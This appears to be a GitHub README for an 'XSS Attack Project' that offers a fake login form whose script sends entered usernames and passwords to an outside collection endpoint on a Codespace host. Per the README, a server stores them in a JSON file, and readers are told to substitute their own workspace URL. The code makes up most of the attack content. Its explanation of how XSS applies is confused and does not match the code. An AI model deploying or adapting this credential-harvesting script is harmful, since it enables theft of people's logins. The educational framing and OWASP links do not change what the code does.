# XSS Attack Project

## Disclaimer
This project is intended for educational purposes only. Cross-Site Scripting (XSS) is a security vulnerability that should only be tested responsibly and with proper authorization. Unauthorized testing of XSS vulnerabilities is illegal and unethical.

## Project Description
This project demonstrates a Cross-Site Scripting (XSS) attack using a simple login form. The server collects login data and saves it to a JSON file.

## Table of Contents

1. [Installation](#installation)
2. [How to run the code](#how-to-run-the-code)
3. [Client Side Code](#client-side-code)
4. [XSS Demo Video](#xss-demo-video)
5. [Contribution Guidelines](#contribution-guidelines)
6. [License Information](#license-information)
7. [Additional Resources](#additional-resources)

## Installation

* Ensure you have Node.js installed on your machine. You can download it from [Node.js](https://nodejs.org/).
* Ensure you have Git installed on your machine. You can download it from [Git](https://git-scm.com/).
* Clone the repository to your local machine.
* Navigate to the project directory.
* Install the dependencies by running the following command:
  ```bash
  npm install
  ```

## How to run the code

* It is recommended to run this project in a local or isolated environment due to potentially sensitive login data. But you can run on GitHub Codespace as well.
* Start the server by running the following command:
  ```bash
  node server.js
  ```

## Client Side Code

```html
<form id="loginForm">
<label for="username">Username:</label>
<input type="text" id="username" name="username" required><br><br>
 
<label for="password">Password:</label>
<input type="password" id="password" name="password" required><br><br>
 
<button type="button" id="loginButton">Login</button>
</form>
 
<script>
const apiUrl = 'https://unearthly-hex-679pp459qqgh574r-8001.app.github.dev/collect';

        function sendLoginToAPI(event) {
            event.preventDefault();

            alert("Login button clicked!");

            const username = $('#username').val();
            const password = $('#password').val();

            if (!username || !password) {
                alert("Both username and password are required.");
                return;
            }

            $.ajax({
                url: apiUrl,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ username: username, password: password }),
                success: function(data) {
                    console.log('Login response:', data);
                    alert('Login successful!');
                },
                error: function(xhr, status, error) {
                    console.error('Login failed:', error);
                    alert('Invalid username or password.');
                }
            });
        }

        $('#loginButton').on('mousedown', sendLoginToAPI);
</script>
```

Change your workspace name to your own workspace name in the apiUrl variable.

### Explanation
The client-side code handles the user input from the login form. When the login button is clicked, the `sendLoginToAPI` function is triggered. This function collects the username and password entered by the user and sends them to the server using an AJAX POST request. The server then processes this data and saves it to a JSON file. The XSS vulnerability could be exploited if an attacker injects malicious scripts into the username or password fields, which would then be executed when the data is processed or displayed.

## XSS Demo Video
<details><summary>View Demo Video</summary>


https://github.com/user-attachments/assets/289917ae-d0b3-43f3-8b9d-1af6f298c824

</details>


## Contribution Guidelines

1. Fork the repository.
2. Create a new branch for your feature or bugfix.
3. Commit your changes with a descriptive message.
4. Push your changes to your forked repository.
5. Create a pull request to the main repository.

## License Information

This project is licensed under the Apache License, Version 2.0.

## Additional Resources

* [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [MDN Web Docs: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
